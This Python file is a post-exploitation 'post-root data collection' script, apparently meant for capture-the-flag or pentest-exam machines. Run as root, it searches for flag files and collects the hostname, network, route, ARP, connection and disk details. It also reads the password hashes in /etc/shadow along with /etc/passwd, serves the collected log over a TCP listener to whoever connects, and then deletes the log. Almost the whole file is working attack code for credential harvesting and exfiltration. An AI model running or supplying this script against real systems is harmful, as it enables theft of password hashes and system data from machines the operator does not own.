#!/usr/bin/env python3

import os
import socket
import subprocess
import sys

# Color Settings
RED     = "\033[31m"
GREEN   = "\033[32m"
YELLOW  = "\033[33m"
BLUE    = "\033[34m"
PURPLE  = "\033[35m"
RESET   = "\033[0m"

BUFF_SZ = 4096
LOG     = "/tmp/postRoot.txt"
TARGET  = "0.0.0.0"


def writeLog (process, name):

    print (GREEN + "[+] " + BLUE + name + RESET)
    with open (LOG, "a") as log:
        log.write ("\n-----" + name + "-----\n")
        while True:
            line = process.stdout.readline ()
            if not line:
                break
            log.writelines (str (line))


def findFile (file, rootPath):

    retVal = ""
    for root, directory, files in os.walk (rootPath):
        if file in files:
            path = os.path.join (root, file)
            retVal = path
    return retVal


def transferFile ():

    print (GREEN + "Data written to file. Preparing transfer" + RESET)
    port = input (YELLOW + "Port Address: " + RESET)
    port = int (port)

    server = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind ((TARGET, port))
        server.listen (5)
        print (BLUE + f"Listening on port {GREEN}{port}{RESET}")
        while True:
            client, address = server.accept ()
            print (GREEN + f"[+] Connection from {BLUE}{address [0]}{GREEN}:{BLUE}{address [1]}" + RESET)
            retVal = True
            break
    except socket.error:
        retVal = False

    if retVal:
        fileSize = os.path.getsize (LOG)
        client.send (f"{fileSize}".encode ())

        with open (LOG, "rb") as file:
            while True:
                temp = file.read (BUFF_SZ)
                if not temp:
                    break
                client.send (temp)
        print (GREEN + "Transfer completed" + RESET)
        retVal = True
    else:
        print (RED + "Transfer failed. Check for port permissions or existing connection and use a different port "
                     "address" + RESET)
        transferFile ()

    client.close ()


def main ():

    if os.getuid () != 0:
        print (RED + "[!] This is a post-root data collection script, and must be run as " + BLUE + "root" + RESET)
        sys.exit (1)

    # Hostname
    temp = subprocess.Popen (['cat', '/etc/hostname'], stdout = subprocess.PIPE, universal_newlines = True)
    writeLog (temp, 'Hostname')
    # Flags Locations
    userFlag = findFile ("user.txt", '/')
    rootFlag = findFile ("root.txt", '/')
    proofFlag = findFile ("proof.txt", '/')
    ntwFlag = findFile ("network-secret.txt", '/')
    if userFlag:
        temp = subprocess.Popen (['cat', userFlag], stdout = subprocess.PIPE, universal_newlines = True)
        writeLog (temp, 'user.txt')
    else:
        print (RED + "[!] " + BLUE + "User Flag not found. Try manually" + RESET)
    if rootFlag:
        temp = subprocess.Popen (['cat', rootFlag], stdout = subprocess.PIPE, universal_newlines = True)
        writeLog (temp, 'root.txt')
    else:
        print (RED + "[!] " + BLUE + "Root Flag not found. Try manually" + RESET)
    if proofFlag:
        temp = subprocess.Popen (['cat', rootFlag], stdout=subprocess.PIPE, universal_newlines=True)
        writeLog (temp, 'root.txt')
    else:
        print(RED + "[!] " + BLUE + "Proof Flag not found. Try manually" + RESET)
    if ntwFlag:
        temp = subprocess.Popen (['cat', ntwFlag], stdout = subprocess.PIPE, universal_newlines = True)
        writeLog (temp, 'network-secret.txt')
    else:
        print (RED + "[!] " + BLUE + "Network Secret not found. Try manually" + RESET)

    # IP Info
    try:
        temp = subprocess.Popen (['ip', 'a'], stdout = subprocess.PIPE, universal_newlines = True)
        writeLog (temp, 'IP Info')
    except subprocess.CalledProcessError:
        try:
            temp = subprocess.Popen (['ifconfig', '-a'], stdout = subprocess.PIPE, universal_newlines = True)
            writeLog (temp, 'IP Info')
        except subprocess.CalledProcessError:
            print (RED + "[!]" + BLUE + "IP information couldn't be identified. Try manually" + RESET)

    # Route Info
    try:
        temp = subprocess.Popen (['/sbin/routel'], stdout = subprocess.PIPE, universal_newlines = True)
        writeLog (temp, 'Route Info')
    except subprocess.CalledProcessError:
        try:
            temp = subprocess.Popen (['/sbin/route'], stdout = subprocess.PIPE, universal_newlines = True)
            writeLog (temp, 'Route Info')
        except subprocess.CalledProcessError:
            try:
                temp = subprocess.Popen (['cat', '/proc/net/route'], stdout = subprocess.PIPE,
                                         universal_newlines = True)
                writeLog (temp, 'Route Info')
            except subprocess.CalledProcessError:
                print (RED + "[!]" + BLUE + "Route information couldn't be identified. Try manually" + RESET)

    # ARP Info
    try:
        temp = subprocess.Popen (['arp', '-a'], stdout = subprocess.PIPE, universal_newlines = True)
        writeLog (temp, 'ARP Info')
    except subprocess.CalledProcessError:
        try:
            temp = subprocess.Popen (['cat', '/proc/net/arp'], stdout = subprocess.PIPE, universal_newlines = True)
            writeLog (temp, 'Route Info')
        except subprocess.CalledProcessError:
            print (RED + "[!]" + BLUE + "ARP information couldn't be identified. Try manually" + RESET)

    # Active Connections
    try:
        temp = subprocess.Popen (['ss', '-antup'], stdout = subprocess.PIPE, universal_newlines = True)
        writeLog (temp, 'Active Connections Info')
    except subprocess.CalledProcessError:
        try:
            temp = subprocess.Popen (['netstat', '-antup'], stdout = subprocess.PIPE, universal_newlines = True)
            writeLog (temp, 'Active Connections Info')
        except subprocess.CalledProcessError:
            print (RED + "[!]" + BLUE + "Active connections info couldn't be identified. Try manually" + RESET)

    # Disk Info
    try:
        temp = subprocess.Popen (['/bin/lsblk'], stdout = subprocess.PIPE, universal_newlines = True)
        writeLog (temp, 'Disk Info')
    except subprocess.CalledProcessError:
        print (RED + "[!]" + BLUE + "Disk info couldn't be gathered. Try manually" + RESET)

    # Mounted Drivers
    try:
        temp = subprocess.Popen (['cat', '/etc/fstab'], stdout = subprocess.PIPE, universal_newlines = True)
        writeLog (temp, "Mounted Drivers")
    except subprocess.CalledProcessError:
        print (RED + "[!]" + BLUE + "Mounted drivers enum failed. Try manually" + RESET)
        
    # shadow and passwd files
    try:
        shad = subprocess.Popen (['cat', '/etc/shadow'], stdout = subprocess.PIPE, universal_newlines = True)
        writeLog (shad, "/etc/shadow")
        passwd = subprocess.Popen (['cat', '/etc/passwd'], stdout = subprocess.PIPE, universal_newlines = True)
        writeLog (passwd, "/etc/passwd")
    except subprocess.CalledProcessError:
        print (RED + "[!]" + BLUE + "passwd and shadow couldn't be enumerated. Try manually" + RESET)

    # Transfer to Target
    transferFile ()
    os.remove (LOG)
    print (BLUE + "[!] Temporary file removed" + RESET)


if __name__ == "__main__":

    main ()
